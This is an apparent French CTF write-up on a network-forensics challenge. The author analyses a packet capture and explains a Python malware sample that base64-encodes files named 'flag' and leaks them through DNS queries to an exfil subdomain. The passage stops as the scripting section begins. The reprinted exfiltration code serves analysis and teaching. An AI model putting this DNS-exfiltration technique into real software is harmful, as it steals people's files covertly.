---
layout: post
title: Bureau Déverrouillé
subtitle: Write-Up pour le NBCTF
tags: [writeup, reseau, prog]
comments: true
---
Bonjour ! Voici mon write-up sur le challenge **Bureau Déverrouillé** à l'occasion du NoBracket CTF. J'ai eu l'opportunité de terminer 2ème avec l'équipe nndy. Tout d'abord, un grand merci au créateur de 
ce challenge, ribt, ainsi qu'à tous les organisateurs et créateurs de challenges, que j'ai pu embêter à de nombreuses reprises à l'occasion de ce CTF. Mais sur ce, passons au challenge !

## Premier coup d'oeil
![Chall](https://github.com/0xBlackRaven/0xBlackRaven.github.io/blob/master/assets/img/challenge_description.png?raw=true){: .mx-auto.d-block :}

La description du challenge ne nous renseigne pas plus que ça sur ce qui aurait pu se passer, mais on peut supposer que des données ont été exfiltrées. Et que tout ça a été enregistré par une capture réseau.
Ca tombe bien, on est justement dans la catégorie réseau !
On télécharge le fichier fourni, sobrement intitulé **capture.pcapng**, on garde en pcapng parce que c'est next-gen et que notre wireshark peut le lire sans problème.

![Wireshark_le_goat](https://cdn.discordapp.com/attachments/822188888297963560/1173656631586865243/85vnqb.jpg?ex=6564bfea&is=65524aea&hm=216a9557f15a87dff50432c6b79ee7a1267ef92c73ecd29dc77af0bb14fa0479&){: .mx-auto.d-block :}

Et hop, on a notre fichier tout propre tout beau, que Wireshark peut lire.
On ouvre donc le fichier, et puis là... On est assez surpris par la longueur du fichier.
La capture fait 7491 trames, principalement des trames DNS. Une première intuition me fait dire que la plus grosse partie du challenge se déroulera là. Ensuite, nous avons au début quelque chose que j'interprète comme l'initialisation de quelque chose. Et là, détail me saute aux yeux : un GET de /malware.py, provenant du site ribt.fr sur le port 8000.

 ![Pas_discret](https://cdn.discordapp.com/attachments/822188888297963560/1173656521385705573/Capture_decran_24.png?ex=6564bfd0&is=65524ad0&hm=45274245d1a8992fc45430afab53f765d6d829bd0151cd1ae27d600e1b3b9a4b&){: .mx-auto.d-block :}

 ![Pas_discret2](https://media.tenor.com/gVHHuzDLos8AAAAC/tiens-tiens-tiens-booba.gif){: .mx-auto.d-block :}

 Nous faisons donc un clic droit -> Suivre -> Flux TCP
 Et nous avons notre malware en clair !
 
 ![Malware](https://cdn.discordapp.com/attachments/822188888297963560/1173657711565607042/Capture_decran_25.png?ex=6564c0eb&is=65524beb&hm=0ba9ba2479432ef2ac7aabae2f81f4cc5bbab369a3fe7b48c3bc2e55e23e7af7&){: .mx-auto.d-block :}
 
 Passons maintenant à l'analyse.
 
![Analyse](https://i.pinimg.com/736x/90/36/85/9036856e213e3f2e8161ae9bfaa24bfd.jpg){: .mx-auto.d-block :}

 ## Analyse du malware  

Intéressons-nous tout d'abord à la première partie du code.
 ```python
files = os.listdir('.')
for f in files:
    if 'flag' in f:
        with open(f, 'rb') as flag:
            data = flag.read()
```
La première ligne recherche tous les fichiers situés dans le répertoire où l'utilisateur est situé, puis itère dessus dans une boucle for. Si le fichier a pour nom "flag", la condition est remplie, donc le programme ouvre l'image en mode lecture, puis stocke les données de flag dans data. Jusque là, rien de sorcier. La partie suivante sera un peu plus intéressante pour nous.

 ```python
encoded = base64.urlsafe_b64encode(data).decode().rstrip("=")
chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
```

Ce morceau de code, qui paraît barbare, est en fait assez simple à comprendre. Nos données, précédemment stockées dans data, sont encodées en base64 (qui je le rappelle n'est pas un mécanisme de chiffrement, pour éviter de vous faire taper par des fans de crypto).
Après, les données encodées sont séparées en morceaux de 63 dans cette liste par compréhension. En gros, cela découpe les données encodées en base64 en morceaux de taille similaire. C'est tout pour cette partie, on passe à la suivante.

```python
queries = [chunk + '.exfil.ribt.fr' for chunk in chunks]
for i in range(len(queries)):
    try:
        socket.gethostbyname(str(i)+"."+queries[i])
    except:
        pass
```

Ici, on se reprend une petite liste par compréhension, qui ajoute juste les morceaux qui avaient été faits avant à `.exfil.ribt.fr`. Tiens... Ca ressemble étrangement à ce qu'on a pu voir dans les requêtes DNS... Etrange. Notre intuition est par la suite confirmée. En gros, le programme tente de résoudre le nom de domaine `{indice de l'itération}.{data encodée en base64}.exfil.ribt.fr` pour trouver l'adresse IP. Mais c'est juste un moyen pour récupérer les données et les envoyer vers le serveur. Sûrement à des fins purement éducatives. Hum hum.
Mais nous avons fini l'analyse de notre malware. Maintenant, passons à la phase que je préfère (c'est faux) : le scripting. En utilisant bien sûr le langage aimé de tous, le bien nommé python.

## Scripting
Tout d'abord, j'avais authentiquement la flemme de manipuler le fichier pour récupérer toutes les trames DNS. C'est alors que j'ai fait un :
```console
blackraven@blackraven:~$ strings capture.pcapng > data.txt
```

Le créateur de ce challenge et moi étions cependant sur la même longueur d'onde quant à cette méthode.  

<iframe width="560" height="315" src="https://www.youtube.com/embed/dUtPtIMIG0I?si=YWsOgrrIVEr9WfVv" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>  

Donc bon, nous allons faire ça propre.


